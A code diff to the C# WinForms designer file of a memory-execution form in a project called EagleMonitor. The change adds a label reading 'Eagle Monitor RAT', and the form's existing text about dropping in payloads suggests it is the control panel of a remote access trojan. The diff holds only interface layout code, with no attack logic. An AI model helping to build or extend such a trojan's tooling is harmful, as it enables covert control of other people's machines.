@@ -43,6 +43,7 @@ namespace EagleMonitor.Forms
             this.removeFromListToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.imageList1 = new System.Windows.Forms.ImageList(this.components);
             this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
             this.memExecContextMenuStrip.SuspendLayout();
             this.SuspendLayout();
             // 
@@ -183,6 +184,17 @@ namespace EagleMonitor.Forms
             this.label1.Text = "Note: Drag and drop payload";
             this.label1.TextAlign = System.Drawing.ContentAlignment.TopCenter;
             // 
+            // label2
+            // 
+            this.label2.BackColor = System.Drawing.Color.Transparent;
+            this.label2.ForeColor = System.Drawing.Color.White;
+            this.label2.Location = new System.Drawing.Point(3, 0);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(235, 32);
+            this.label2.TabIndex = 44;
+            this.label2.Text = "Eagle Monitor RAT";
+            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            // 
             // MemoryExecutionForm
             // 
             this.AllowDrop = true;
@@ -190,6 +202,7 @@ namespace EagleMonitor.Forms
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
             this.ClientSize = new System.Drawing.Size(678, 311);
+            this.Controls.Add(this.label2);
             this.Controls.Add(this.listView1);
             this.Controls.Add(this.label1);
             this.Controls.Add(this.closeButton);
@@ -222,5 +235,6 @@ namespace EagleMonitor.Forms
         private System.Windows.Forms.ToolStripMenuItem removeFromListToolStripMenuItem;
         private System.Windows.Forms.Label label1;
         private System.Windows.Forms.ToolStripMenuItem addPayloadToolStripMenuItem;
+        public System.Windows.Forms.Label label2;
     }
 }
